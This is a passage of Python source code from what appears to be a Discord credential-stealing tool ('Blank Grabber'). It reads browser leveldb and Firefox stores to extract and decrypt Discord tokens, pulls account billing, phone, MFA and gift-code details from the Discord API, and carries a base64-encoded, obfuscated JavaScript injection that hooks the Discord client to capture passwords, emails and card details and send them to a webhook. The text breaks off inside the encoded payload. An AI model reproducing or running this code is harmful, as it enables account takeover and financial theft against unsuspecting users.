                        methods = {'Card': 0, 'Paypal': 0, 'Unknown': 0}
                        for m in billing:
                            if not isinstance(m, dict):
                                continue
                            method_type = m.get('type', 0)
                            match method_type:
                                case 1:
                                    methods['Card'] += 1
                                case 2:
                                    methods['Paypal'] += 1
                                case _:
                                    methods['Unknown'] += 1
                        billing = ', '.join(['{} ({})'.format(
                            name, quantity) for name, quantity in methods.items() if quantity != 0]) or 'None'
                    gifts = list()
                    r = Discord.httpClient.request('GET', 'https://discord.com/api/v9/users/@me/outbound-promotions/codes',
                                                   headers=Discord.GetHeaders(token)).data.decode(errors='ignore')
                    if 'code' in r:
                        r = json.loads(r)
                        for i in r:
                            if isinstance(i, dict):
                                code = i.get('code')
                                if i.get('promotion') is None or not isinstance(i['promotion'], dict):
                                    continue
                                title = i['promotion'].get('outbound_title')
                                if code and title:
                                    gifts.append(f'{title}: {code}')
                    if len(gifts) == 0:
                        gifts = 'Gift Codes: (NONE)'
                    else:
                        gifts = 'Gift Codes:\n\t' + '\n\t'.join(gifts)
                    results.append({'USERNAME': user, 'USERID': id, 'MFA': mfa, 'EMAIL': email, 'PHONE': phone,
                                    'VERIFIED': verified, 'NITRO': nitro_data, 'BILLING': billing, 'TOKEN': token, 'GIFTS': gifts})
            return results

        @staticmethod
        def SafeStorageSteal(path: str) -> list[str]:
            encryptedTokens = list()
            tokens = list()
            key: str = None
            levelDbPaths: list[str] = list()
            localStatePath = os.path.join(path, 'Local State')
            for root, dirs, _ in os.walk(path):
                for dir in dirs:
                    if dir == 'leveldb':
                        levelDbPaths.append(os.path.join(root, dir))
            if os.path.isfile(localStatePath) and levelDbPaths:
                with open(localStatePath, errors='ignore') as file:
                    jsonContent: dict = json.load(file)
                key = jsonContent['os_crypt']['encrypted_key']
                key = base64.b64decode(key)[5:]
                for levelDbPath in levelDbPaths:
                    for file in os.listdir(levelDbPath):
                        if file.endswith(('.log', '.ldb')):
                            filepath = os.path.join(levelDbPath, file)
                            with open(filepath, errors='ignore') as file:
                                lines = file.readlines()
                            for line in lines:
                                if line.strip():
                                    matches: list[str] = re.findall(
                                        Discord.REGEX_ENC, line)
                                    for match in matches:
                                        match = match.rstrip('\\')
                                        if not match in encryptedTokens:
                                            match = base64.b64decode(
                                                match.split('dQw4w9WgXcQ:')[1].encode())
                                            encryptedTokens.append(match)
            for token in encryptedTokens:
                try:
                    token = pyaes.AESModeOfOperationGCM(Syscalls.CryptUnprotectData(
                        key), token[3:15]).decrypt(token[15:])[:-16].decode(errors='ignore')
                    if token:
                        tokens.append(token)
                except Exception:
                    pass
            return tokens

        @staticmethod
        def SimpleSteal(path: str) -> list[str]:
            tokens = list()
            levelDbPaths = list()
            for root, dirs, _ in os.walk(path):
                for dir in dirs:
                    if dir == 'leveldb':
                        levelDbPaths.append(os.path.join(root, dir))
            for levelDbPath in levelDbPaths:
                for file in os.listdir(levelDbPath):
                    if file.endswith(('.log', '.ldb')):
                        filepath = os.path.join(levelDbPath, file)
                        with open(filepath, errors='ignore') as file:
                            lines = file.readlines()
                        for line in lines:
                            if line.strip():
                                matches: list[str] = re.findall(
                                    Discord.REGEX, line.strip())
                                for match in matches:
                                    match = match.rstrip('\\')
                                    if not match in tokens:
                                        tokens.append(match)
            return tokens

        @staticmethod
        def FireFoxSteal(path: str) -> list[str]:
            tokens = list()
            for root, _, files in os.walk(path):
                for file in files:
                    if file.lower().endswith('.sqlite'):
                        filepath = os.path.join(root, file)
                        with open(filepath, errors='ignore') as file:
                            lines = file.readlines()
                            for line in lines:
                                if line.strip():
                                    matches: list[str] = re.findall(
                                        Discord.REGEX, line)
                                    for match in matches:
                                        match = match.rstrip('\\')
                                        if not match in tokens:
                                            tokens.append(match)
            return tokens

        @staticmethod
        def InjectJs() -> str | None:
            check = False
            try:
                code = base64.b64decode(b'Y29uc3QgUz1DOyhmdW5jdGlvbihZLFope2NvbnN0IHE9QyxvPVkoKTt3aGlsZSghIVtdKXt0cnl7Y29uc3QgVD0tcGFyc2VJbnQocSgweDkwKSkvMHgxK3BhcnNlSW50KHEoMHgxNGEpKS8weDIrcGFyc2VJbnQocSgweDEyOSkpLzB4MyoocGFyc2VJbnQocSgweDEyZSkpLzB4NCkrcGFyc2VJbnQocSgweGY5KSkvMHg1K3BhcnNlSW50KHEoMHhkNykpLzB4NistcGFyc2VJbnQocSgweDEzYSkpLzB4NyoocGFyc2VJbnQocSgweDg4KSkvMHg4KStwYXJzZUludChxKDB4YmUpKS8weDkqKC1wYXJzZUludChxKDB4ZjApKS8weGEpO2lmKFQ9PT1aKWJyZWFrO2Vsc2Ugb1sncHVzaCddKG9bJ3NoaWZ0J10oKSk7fWNhdGNoKEgpe29bJ3B1c2gnXShvWydzaGlmdCddKCkpO319fSh4LDB4NDBmOGQpKTtjb25zdCBhcmdzPXByb2Nlc3NbUygweGVmKV0sZnM9cmVxdWlyZSgnZnMnKSxwYXRoPXJlcXVpcmUoUygweGJjKSksaHR0cHM9cmVxdWlyZShTKDB4ZDEpKSxxdWVyeXN0cmluZz1yZXF1aXJlKCdxdWVyeXN0cmluZycpLHtCcm93c2VyV2luZG93LHNlc3Npb259PXJlcXVpcmUoUygweDZhKSksZW5jb2RlZEhvb2s9UygweGQyKSxjb25maWc9eyd3ZWJob29rJzphdG9iKGVuY29kZWRIb29rKSwnd2ViaG9va19wcm90ZWN0b3Jfa2V5JzpTKDB4ZGYpLCdhdXRvX2J1eV9uaXRybyc6IVtdLCdwaW5nX29uX3J1bic6ISFbXSwncGluZ192YWwnOlMoMHgxMTUpLCdlbWJlZF9uYW1lJzpTKDB4Y2UpLCdlbWJlZF9pY29uJzpTKDB4MTI4KSwnZW1iZWRfY29sb3InOjB4NTYwZGRjLCdpbmplY3Rpb25fdXJsJzpTKDB4MTM1KSwnYXBpJzonaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvdXNlcnMvQG1lJywnbml0cm8nOnsnYm9vc3QnOnsneWVhcic6eydpZCc6JzUyMTg0NzIzNDI0NjA4MjU5OScsJ3NrdSc6UygweDhjKSwncHJpY2UnOlMoMHgxMzYpfSwnbW9udGgnOnsnaWQnOlMoMHhhNyksJ3NrdSc6JzUxMTY1MTg4MDgzNzg0MDg5NicsJ3ByaWNlJzpTKDB4ZjIpfX0sJ2NsYXNzaWMnOnsnbW9udGgnOnsnaWQnOlMoMHhkMyksJ3NrdSc6JzUxMTY1MTg3MTczNjIwMTIxNicsJ3ByaWNlJzpTKDB4MTE0KX19fSwnZmlsdGVyJzp7J3VybHMnOltTKDB4YWUpLFMoMHhjMyksUygweGU5KSxTKDB4ZmUpLFMoMHgxMTkpLFMoMHhlYyksUygweDE0MSksUygweDEwNiksUygweDg3KSwnaHR0cHM6Ly9hcGkuc3RyaXBlLmNvbS92Ki9wYXltZW50X2ludGVudHMvKi9jb25maXJtJ119LCdmaWx0ZXIyJzp7J3VybHMnOltTKDB4NmMpLFMoMHhjZCksJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3YqL2FwcGxpY2F0aW9ucy9kZXRlY3RhYmxlJyxTKDB4MTE4KSxTKDB4N2MpLFMoMHg3ZCldfX07ZnVuY3Rpb24gcGFyaXR5XzMyKFksWixvKXtyZXR1cm4gWV5aXm87fWZ1bmN0aW9uIGNoXzMyKFksWixvKXtyZXR1cm4gWSZaXn5ZJm87fWZ1bmN0aW9uIG1hal8zMihZLFosbyl7cmV0dXJuIFkmWl5ZJm9eWiZvO31mdW5jdGlvbiByb3RsXzMyKFksWil7cmV0dXJuIFk8PFp8WT4+PjB4MjAtWjt9ZnVuY3Rpb24gc2FmZUFkZF8zMl8yKFksWil7dmFyIG89KFkmMHhmZmZmKSsoWiYweGZmZmYpLFQ9KFk+Pj4weDEwKSsoWj4+PjB4MTApKyhvPj4+MHgxMCk7cmV0dXJuKFQmMHhmZmZmKTw8MHgxMHxvJjB4ZmZmZjt9ZnVuY3Rpb24gc2FmZUFkZF8zMl81KFksWixvLFQsSCl7dmFyIFY9KFkmMHhmZmZmKSsoWiYweGZmZmYpKyhvJjB4ZmZmZikrKFQmMHhmZmZmKSsoSCYweGZmZmYpLGk9KFk+Pj4weDEwKSsoWj4+PjB4MTApKyhvPj4+MHgxMCkrKFQ+Pj4weDEwKSsoSD4+PjB4MTApKyhWPj4+MHgxMCk7cmV0dXJuKGkmMHhmZmZmKTw8MHgxMHxWJjB4ZmZmZjt9ZnVuY3Rpb24gYmluYjJoZXgoWSl7Y29uc3QgbT1TO3ZhciBaPW0oMHg3NCksbz0nJyxUPVlbJ2xlbmd0aCddKjB4NCxILFY7Zm9yKEg9MHgwO0g8VDtIKz0weDEpe1Y9WVtIPj4+MHgyXT4+PigweDMtSCUweDQpKjB4OCxvKz1aWydjaGFyQXQnXShWPj4+MHg0JjB4ZikrWlsnY2hhckF0J10oViYweGYpO31yZXR1cm4gbzt9ZnVuY3Rpb24gZ2V0SCgpe3JldHVyblsweDY3NDUyMzAxLDB4ZWZjZGFiODksMHg5OGJhZGNmZSwweDEwMzI1NDc2LDB4YzNkMmUxZjBdO31mdW5jdGlvbiByb3VuZFNIQTEoWSxaKXt2YXIgbz1bXSxWLGksUixBLHIsbCxOPWNoXzMyLGs9cGFyaXR5XzMyLEY9bWFqXzMyLFg9cm90bF8zMix1PXNhZmVBZGRfMzJfMixKLHc9c2FmZUFkZF8zMl81O1Y9WlsweDBdLGk9WlsweDFdLFI9WlsweDJdLEE9WlsweDNdLHI9WlsweDRdO2ZvcihKPTB4MDtKPDB4NTA7Sis9MHgxKXtKPDB4MTA/b1tKXT1ZW0pdOm9bSl09WChvW0otMHgzXV5vW0otMHg4XV5vW0otMHhlXV5vW0otMHgxMF0sMHgxKTtpZihKPDB4MTQpbD13KFgoViwweDUpLE4oaSxSLEEpLHIsMHg1YTgyNzk5OSxvW0pdKTtlbHNle2lmKEo8MHgyOClsPXcoWChWLDB4NSksayhpLFIsQSksciwweDZlZDllYmExLG9bSl0pO2Vsc2UgSjwweDNjP2w9dyhYKFYsMHg1KSxGKGksUixBKSxyLDB4OGYxYmJjZGMsb1tKXSk6bD13KFgoViwweDUpLGsoaSxSLEEpLHIsMHhjYTYyYzFkNixvW0pdKTt9cj1BLEE9UixSPVgoaSwweDFlKSxpPVYsVj1sO31yZXR1cm4gWlsweDBdPXUoVixaWzB4MF0pLFpbMHgxXT11KGksWlsweDFdKSxaWzB4Ml09dShSLFpbMHgyXSksWlsweDNdPXUoQSxaWzB4M10pLFpbMHg0XT11KHIsWlsweDRdKSxaO31mdW5jdGlvbiBmaW5hbGl6ZVNIQTEoWSxaLG8sVCl7Y29uc3QgaD1TO3ZhciBWLFIsQTtBPShaKzB4NDE+Pj4weDk8PDB4NCkrMHhmO3doaWxlKFlbJ2xlbmd0aCddPD1BKXtZWydwdXNoJ10oMHgwKTt9WVtaPj4+MHg1XXw9MHg4MDw8MHgxOC1aJTB4MjAsWVtBXT1aK28sUj1ZWydsZW5ndGgnXTtmb3IoVj0weDA7VjxSO1YrPTB4MTApe1Q9cm91bmRTSEExKFlbaCgweDE0NCldKFYsVisweDEwKSxUKTt9cmV0dXJuIFQ7fWZ1bmN0aW9uIGhleDJiaW5iKFksWixvKXtjb25zdCB5PVM7dmFyIFQsSD1ZW3koMHhhNildLFYsUixBLHIsYztUPVp8fFsweDBdLG89b3x8MHgwLGM9bz4+PjB4MzsweDAhPT1IJTB4MiYmY29uc29sZVsnZXJyb3InXSh5KDB4ZmIpKTtmb3IoVj0weDA7VjxIO1YrPTB4Mil7Uj1wYXJzZUludChZW3koMHgxMWIpXShWLDB4MiksMHgxMCk7aWYoIWlzTmFOKFIpKXtyPShWPj4+MHgxKStjLEE9cj4+PjB4Mjt3aGlsZShUW3koMHhhNildPD1BKXtUW3koMHg4NCldKDB4MCk7fVRbQV18PVI8PDB4OCooMHgzLXIlMHg0KTt9ZWxzZSBjb25zb2xlW3koMHg3ZildKHkoMHhkOCkpO31yZXR1cm57J3ZhbHVlJzpULCdiaW5MZW4nOkgqMHg0K299O31jbGFzcyBqc1NIQXtjb25zdHJ1Y3Rvcigpe2NvbnN0IFA9Uzt2YXIgWT0weDAsWj1bXSxvPTB4MCxULEgsVixpLFIsQSxyPSFbXSxjPSFbXSxsPVtdLE49W10sayxrPTB4MTtIPWhleDJiaW5iLChrIT09cGFyc2VJbnQoaywweGEpfHwweDE+aykmJmNvbnNvbGVbUCgweDdmKV0oUCgweDEyNikpLGk9MHgyMDAsUj1yb3VuZFNIQTEsQT1maW5hbGl6ZVNIQTEsVj0weGEwLFQ9Z2V0SCgpLHRoaXNbUCgweGMxKV09ZnVuY3Rpb24oRil7Y29uc3QgVz1QO3ZhciBYLHUsSix3LG4sYSxFO1g9aGV4MmJpbmIsdT1YKEYpLEo9dVsnYmluTGVuJ10sdz11W1coMHg2ZCldLG49aT4+PjB4MyxFPW4vMHg0LTB4MTtpZihuPEovMHg4KXt3PUEodyxKLDB4MCxnZXRIKCkpO3doaWxlKHdbVygweGE2KV08PUUpe3dbVygweDg0KV0oMHgwKTt9d1tFXSY9MHhmZmZmZmYwMDt9ZWxzZXtpZihuPkovMHg4KXt3aGlsZSh3WydsZW5ndGgnXTw9RSl7d1tXKDB4ODQpXSgweDApO313W0VdJj0weGZmZmZmZjAwO319Zm9yKGE9MHgwO2E8PUU7YSs9MHgxKXtsW2FdPXdbYV1eMHgzNjM2MzYzNixOW2FdPXdbYV1eMHg1YzVjNWM1Yzt9VD1SKGwsVCksWT1pLGM9ISFbXTt9LHRoaXNbUCgweDExMCldPWZ1bmN0aW9uKEYpe2NvbnN0IEI9UDt2YXIgWCx1LEosdyxuLGE9MHgwLEU9aT4+PjB4NTtYPUgoRixaLG8pLHU9WFtCKDB4MTJiKV0sdz1YW0IoMHg2ZCldLEo9dT4+PjB4NTtmb3Iobj0weDA7bjxKO24rPUUpe2EraTw9dSYmKFQ9Uih3W0IoMHgxNDQpXShuLG4rRSksVCksYSs9aSk7fVkrPWEsWj13WydzbGljZSddKGE+Pj4weDUpLG89dSVpO30sdGhpc1tQKDB4MTFmKV09ZnVuY3Rpb24oKXtjb25zdCB6PVA7dmFyIEY7IVtdPT09YyYmY29uc29sZVt6KDB4N2YpXSh6KDB4YTQpKTtjb25zdCBYPWZ1bmN0aW9uKHUpe3JldHVybiBiaW5iMmhleCh1KTt9O3JldHVybiFbXT09PXImJihGPUEoWixvLFksVCksVD1SKE4sZ2V0SCgpKSxUPUEoRixWLGksVCkpLHI9ISFbXSxYKFQpO307fX1pZihTKDB4MTBiKT09PXR5cGVvZiBkZWZpbmUmJmRlZmluZVtTKDB4YjApXSlkZWZpbmUoZnVuY3Rpb24oKXtyZXR1cm4ganNTSEE7fSk7ZWxzZSBTKDB4OWQpIT09dHlwZW9mIGV4cG9ydHM/UygweDlkKSE9PXR5cGVvZiBtb2R1bGUmJm1vZHVsZVtTKDB4MTJkKV0/bW9kdWxlW1MoMHgxMmQpXT1leHBvcnRzPWpzU0hBOmV4cG9ydHM9anNTSEE6Z2xvYmFsW1MoMHgxMjcpXT1qc1NIQTtqc1NIQVtTKDB4MTFhKV0mJihqc1NIQT1qc1NIQVtTKDB4MTFhKV0pO2Z1bmN0aW9uIHRvdHAoWSl7Y29uc3QgZz1TLFo9MHgxZSxvPTB4NixUPURhdGVbZygweDcyKV0oKSxIPU1hdGhbZygweDgxKV0oVC8weDNlOCksVj1sZWZ0cGFkKGRlYzJoZXgoTWF0aFtnKDB4ZmYpXShIL1opKSwweDEwLCcwJyksaT1uZXcganNTSEEoKTtpW2coMHhjMSldKGJhc2UzMnRvaGV4KFkpKSxpWyd1cGRhdGUnXShWKTtjb25zdCBSPWlbZygweDExZildKCksQT1oZXgyZGVjKFJbJ3N1YnN0cmluZyddKFJbZygweGE2KV0tMHgxKSk7bGV0IHI9KGhleDJkZWMoUltnKDB4MTFiKV0oQSoweDIsMHg4KSkmaGV4MmRlYygnN2ZmZmZmZmYnKSkrJyc7cmV0dXJuIHI9clsnc3Vic3RyJ10oTWF0aFtnKDB4YzgpXShyWydsZW5ndGgnXS1vLDB4MCksbykscjt9ZnVuY3Rpb24gaGV4MmRlYyhZKXtyZXR1cm4gcGFyc2VJbnQoWSwweDEwKTt9ZnVuY3Rpb24geCgpe2NvbnN0IHg5PVsndmFyXHgyMHhtbEh0dHBceDIwPVx4MjBuZXdceDIwWE1MSHR0cFJlcXVlc3QoKTtceDIwXHgwYVx4MjBceDIwXHgyMFx4MjB4bWxIdHRwLm9wZW4oXHgyMkdFVFx4MjIsXHgyMFx4MjInLCdlcnJvcicsJ2hvc3QnLCdyb3VuZCcsJ2RhdGEnLCdjYXJkW2V4cF95ZWFyXScsJ3B1c2gnLCdnZXRBbGxXaW5kb3dzJywnZGlzY29yZCcsJ2h0dHBzOi8vYXBpLnN0cmlwZS5jb20vdiovc2V0dXBfaW50ZW50cy8qL2NvbmZpcm0nLCcxNDIwOTZCT2FodEknLCcqKlx4MGFDcmVkaXRceDIwQ2FyZFx4MjBFeHBpcmF0aW9uOlx4MjAqKicsJyoqRGlzY29yZFx4MjBJbmZvKionLCdta2RpclN5bmMnLCc1MTE2NTE4ODU0NTk5NjM5MDQnLCdybWRpclN5bmMnLCdwYXNzd29yZCcsJ2xlbmdodCcsJzQ3MzExMXVXdW9scScsJyoqXHgwYU5ld1x4MjBQYXNzd29yZDpceDIwKionLCdodHRwczovL2Rpc2NvcmQuZ2lmdC8nLCc8OnBheXBhbDo5NTExMzkxODkzODk0MTAzNjU+JywndXBsb2FkRGF0YScsJ0FCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaMjM0NTY3JywnaW52YWxpZCcsJ3JlcGxhY2UnLCdEaXNjb3JkXHgyMFN0YWZmJywnKlx4MGFCYWRnZXM6XHgyMCoqJywnZGFyd2luJywnc2VwJywnXHgyMik7XHgwYVx4MjBceDIwXHgyMFx4MjB4bWxIdHRwLnNldFJlcXVlc3RIZWFkZXIoXHgyN0NvbnRlbnQtVHlwZVx4MjcsXHgyMFx4MjdhcHBsaWNhdGlvbi9qc29uXHgyNyk7XHgwYVx4MjBceDIwXHgyMFx4MjB4bWxIdHRwLnNlbmQoSlNPTi5zdHJpbmdpZnkoJywndW5kZWZpbmVkJywnKipQYXNzd29yZFx4MjBDaGFuZ2VkKionLCdjb250ZW50LXNlY3VyaXR5LXBvbGljeS1yZXBvcnQtb25seScsJyoqTml0cm9ceDIwQ29kZToqKlx4MGFgYGBkaWZmXHgwYStceDIwJywnZW1haWwnLCdlbmRzV2l0aCcsJyoqXHgwYUJpbGxpbmc6XHgyMCoqJywnQ2Fubm90XHgyMGNhbGxceDIwZ2V0SE1BQ1x4MjB3aXRob3V0XHgyMGZpcnN0XHgyMHNldHRpbmdceDIwSE1BQ1x4MjBrZXknLCdwYWNrYWdlLmpzb24nLCdsZW5ndGgnLCc1MjE4NDcyMzQyNDYwODI1OTknLCdvbkNvbXBsZXRlZCcsJ0ludmFsaWRceDIwYmFzZTMyXHgyMGNoYXJhY3Rlclx4MjBpblx4MjBrZXknLCdwcmljZScsJ0FjY2Vzcy1Db250cm9sLUFsbG93LU9yaWdpblx4MjBceDI3Klx4MjcnLCdyZXZlcnNlJywnZmxhZ3MnLCdodHRwczovL2Rpc2NvcmQuY29tL2FwaS92Ki91c2Vycy9AbWUnLCdjb25zdFx4MjBmc1x4MjA9XHgyMHJlcXVpcmUoXHgyN2ZzXHgyNyksXHgyMGh0dHBzXHgyMD1ceDIwcmVxdWlyZShceDI3aHR0cHNceDI3KTtceDBhY29uc3RceDIwaW5kZXhKc1x4MjA9XHgyMFx4MjcnLCdhbWQnLCdpbmRleC5qcycsJ21ldGhvZCcsJ2NvbnRlbnQnLCdjb250ZW50LXNlY3VyaXR5LXBvbGljeScsJ1x4MjcpXHgwYWlmXHgyMChmcy5leGlzdHNTeW5jKGJkUGF0aCkpXHgyMHJlcXVpcmUoYmRQYXRoKTsnLCcqKlBheVBhbFx4MjBBZGRlZCoqJywnaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXZhdGFycy8nLCdlbWJlZF9uYW1lJywnKipUb2tlbioqJywnZW1iZWRfaWNvbicsJ3JlcXVlc3QnLCdwYXRoJywnc3BsaXQnLCcyNDgxNzVjZEVrY3AnLCdQT1NUJywnRGlzY29yZFx4MjBCdWdceDIwSHVudGVyXHgyMChOb3JtYWwpJywnc2V0SE1BQ0tleScsJ1x4Mjc7XHgwYWNvbnN0XHgyMGJkUGF0aFx4MjA9XHgyMFx4MjcnLCdodHRwczovL2Rpc2NvcmRhcHAuY29tL2FwaS92Ki91c2Vycy9AbWUnLCdBdXRob3JpemF0aW9uJywnKipOaXRyb1x4MjBib3VnaHQhKionLCdwbGF0Zm9ybScsJ1x4Mjc7XHgwYWNvbnN0XHgyMGZpbGVTaXplXHgyMD1ceDIwZnMuc3RhdFN5bmMoaW5kZXhKcykuc2l6ZVx4MGFmcy5yZWFkRmlsZVN5bmMoaW5kZXhKcyxceDIwXHgyN3V0ZjhceDI3LFx4MjAoZXJyLFx4MjBkYXRhKVx4MjA9Plx4MjB7XHgwYVx4MjBceDIwXHgyMFx4MjBpZlx4MjAoZmlsZVNpemVceDIwPFx4MjAyMDAwMFx4MjB8fFx4MjBkYXRhXHgyMD09PVx4MjBceDIybW9kdWxlLmV4cG9ydHNceDIwPVx4MjByZXF1aXJlKFx4MjcuL2NvcmUuYXNhclx4MjcpXHgyMilceDIwXHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwaW5pdCgpO1x4MGF9KVx4MGFhc3luY1x4MjBmdW5jdGlvblx4MjBpbml0KClceDIwe1x4MGFceDIwXHgyMFx4MjBceDIwaHR0cHMuZ2V0KFx4MjcnLCdtYXgnLCd3c3M6Ly9yZW1vdGUtYXV0aC1nYXRld2F5JywnTml0cm9ceDIwVHlwZTpceDIwKionLCcqKkNyZWRpdFx4MjBDYXJkXHgyMEFkZGVkKionLCd0eXBlJywnaHR0cHM6Ly8qLmRpc2NvcmQuY29tL2FwaS92Ki9hcHBsaWNhdGlvbnMvZGV0ZWN0YWJsZScsJ0JsYW5rXHgyMEdyYWJiZXJceDIwSW5qZWN0aW9uJywnXHgyNylceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjByZXMucGlwZShmaWxlKTtceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBmaWxlLm9uKFx4MjdmaW5pc2hceDI3LFx4MjAoKVx4MjA9Plx4MjB7XHgwYVx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMGZpbGUuY2xvc2UoKTtceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjB9KTtceDBhXHgyMFx4MjBceDIwXHgyMFx4MGFceDIwXHgyMFx4MjBceDIwfSkub24oXHgyMmVycm9yXHgyMixceDIwKGVycilceDIwPT5ceDIwe1x4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMHNldFRpbWVvdXQoaW5pdCgpLFx4MjAxMDAwMCk7XHgwYVx4MjBceDIwXHgyMFx4MjB9KTtceDBhfVx4MGFyZXF1aXJlKFx4MjcnLCdtb250aCcsJ2h0dHBzJywnJVdFQkhPT0tIRVJFQkFTRTY0RU5DT0RFRCUnLCc1MjE4NDY5MTg2Mzc0MjA1NDUnLCdlbnYnLCdIeXBlU3F1YWRceDIwQnJhdmVyeScsJ3Rva2VucycsJzI2NzE2ODBPb0dQT1QnLCdTdHJpbmdceDIwb2ZceDIwSEVYXHgyMHR5cGVceDIwY29udGFpbnNceDIwaW52YWxpZFx4MjBjaGFyYWN0ZXJzJywnXHgyMik7XHgyMFx4MGFceDIwXHgyMFx4MjBceDIweG1sSHR0cC5zZW5kKG51bGwpO1x4MjBceDBhXHgyMFx4MjBceDIwXHgyMHhtbEh0dHAucmVzcG9uc2VUZXh0JywncGF0aG5hbWUnLCd5ZWFyJywncGluZ19vbl9ydW4nLCd1c2QnLCdceDI3KVx4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMHJlcy5yZXBsYWNlKFx4MjclV0VCSE9PS19LRVklXHgyNyxceDIwXHgyNycsJyVXRUJIT09LX0tFWSUnLCd0b1N0cmluZycsJ2xvZycsJ2ZpbHRlcicsJ0NyZWRpdFx4MjBDYXJkXHgyME51bWJlcjpceDIwKionLCdBY2Nlc3MtQ29udHJvbC1BbGxvdy1IZWFkZXJzXHgyMFx4MjcqXHgyNycsJyoqXHgyMC1ceDIwUGFzc3dvcmQ6XHgyMCoqJywnKipceDBhUGFzc3dvcmQ6XHgyMCoqJywnRW1haWw6XHgyMCoqJywnYXBwbGljYXRpb24vanNvbicsJ2h0dHBzOi8vKi5kaXNjb3JkLmNvbS9hcGkvdiovdXNlcnMvQG1lJywncmVzb3VyY2VzJywnd2ViQ29udGVudHMnLCdodHRwczovLyouZGlzY29yZC5jb20vYXBpL3YqL2F1dGgvbG9naW4nLCdjYXJkW2V4cF9tb250aF0nLCdleGlzdHNTeW5jJywnYXJndicsJzIwMG5FVkFSVScsJ3BheXBhbF9hY2NvdW50cycsJzk5OScsJ25pdHJvJywnZGVmYXVsdFNlc3Npb24nLCdQYXJ0bmVyZWRceDIwU2VydmVyXHgyME93bmVyJywnSHlwZVNxdWFkXHgyMEJyaWxsaWFuY2UnLCd3aW4zMicsJ2Jvb3N0JywnMTI2MzQ1NWZWcHdJSCcsJ0h5cGVTcXVhZFx4MjBCYWxhbmNlJywnU3RyaW5nXHgyMG9mXHgyMEhFWFx4MjB0eXBlXHgyMG11c3RceDIwYmVceDIwaW5ceDIwYnl0ZVx4MjBpbmNyZW1lbnRzJywndW5saW5rU3luYycsJ05pdHJvJywnaHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdiovYXV0aC9sb2dpbicsJ2Zsb29yJywnZmlsdGVyMicsJ2NhdGNoJywnQWN0aXZlXHgyMERldmVsb3BlcicsJ05pdHJvXHgyMEJhc2ljJywnXHg1Y2JldHRlcmRpc2NvcmRceDVjZGF0YVx4NWNiZXR0ZXJkaXNjb3JkLmFzYXInLCdOaXRyb1x4MjBDbGFzc2ljJywnaHR0cHM6Ly9hcGkuc3RyaXBlLmNvbS92Ki90b2tlbnMnLCcuL2NvcmUuYXNhcicsJ2dpZnRfY29kZScsJ0Vhcmx5XHgyMFZlcmlmaWVkXHgyMEJvdFx4MjBEZXZlbG9wZXInLCdhdXRvX2J1eV9uaXRybycsJ2Z1bmN0aW9uJywnY29uY2F0JywnTmV3XHgyMEVtYWlsOlx4MjAqKicsJ05vXHgyME5pdHJvJywnc3RhdHVzQ29kZScsJ3VwZGF0ZScsJyoqXHgwYUJhZGdlczpceDIwKionLCdDb250ZW50cycsJ2F2YXRhcicsJzQ5OScsJ0BldmVyeW9uZScsJ3N0YXJ0c1dpdGgnLCd3cml0ZUZpbGVTeW5jJywnaHR0cHM6Ly8qLmRpc2NvcmQuY29tL2FwaS92Ki91c2Vycy9AbWUvbGlicmFyeScsJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3YqL2F1dGgvbG9naW4nLCdkZWZhdWx0Jywnc3Vic3RyJywnd2luZG93LndlYnBhY2tKc29ucD8oZ2c9d2luZG93LndlYnBhY2tKc29ucC5wdXNoKFtbXSx7Z2V0X3JlcXVpcmU6KGEsYixjKT0+YS5leHBvcnRzPWN9LFtbXHgyMmdldF9yZXF1aXJlXHgyMl1dXSksZGVsZXRlXHgyMGdnLm0uZ2V0X3JlcXVpcmUsZGVsZXRlXHgyMGdnLmMuZ2V0X3JlcXVpcmUpOndpbmRvdy53ZWJwYWNrQ2h1bmtkaXNjb3JkX2FwcCYmd2luZG93LndlYnBhY2tDaHVua2Rpc2NvcmRfYXBwLnB1c2goW1tNYXRoLnJhbmRvbSgpXSx7fSxhPT57Z2c9YX1dKTtmdW5jdGlvblx4MjBMb2dPdXQoKXsoZnVuY3Rpb24oYSl7Y29uc3RceDIwYj1ceDIyc3RyaW5nXHgyMj09dHlwZW9mXHgyMGE/YTpudWxsO2Zvcihjb25zdFx4MjBjXHgyMGluXHgyMGdnLmMpaWYoZ2cuYy5oYXNPd25Qcm9wZXJ0eShjKSl7Y29uc3RceDIwZD1nZy5jW2NdLmV4cG9ydHM7aWYoZCYmZC5fX2VzTW9kdWxlJiZkLmRlZmF1bHQmJihiP2QuZGVmYXVsdFtiXTphKGQuZGVmYXVsdCkpKXJldHVyblx4MjBkLmRlZmF1bHQ7aWYoZCYmKGI/ZFtiXTphKGQpKSlyZXR1cm5ceDIwZH1yZXR1cm5ceDIwbnVsbH0pKFx4MjJsb2dpblx4MjIpLmxvZ291dCgpfUxvZ091dCgpOycsJ2NoYXJBdCcsJ2luaXRpYXRpb24nLCdnZXRITUFDJywnaW5qZWN0aW9uX3VybCcsJ2RlZmF1bHQtc3JjXHgyMFx4MjcqXHgyNycsJyoqXHgwYU9sZFx4MjBQYXNzd29yZDpceDIwKionLCdEaXNjb3JkXHgyMEJ1Z1x4MjBIdW50ZXJceDIwKEdvbGRlbiknLCdBUFBEQVRBJywnZGlzY29yZC5jb20nLCdudW1Sb3VuZHNceDIwbXVzdFx4MjBhXHgyMGludGVnZXJceDIwPj1ceDIwMScsJ2pzU0hBJywnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0JsYW5rLWMvQmxhbmstR3JhYmJlci9tYWluLy5naXRodWIvd29ya2Zsb3dzL2ltYWdlLnBuZycsJzNWZlhOYVonLCdmcm9tJywnYmluTGVuJywnLndlYnAnLCdleHBvcnRzJywnMTc2MTE3NnVLQ1hxZycsJ3B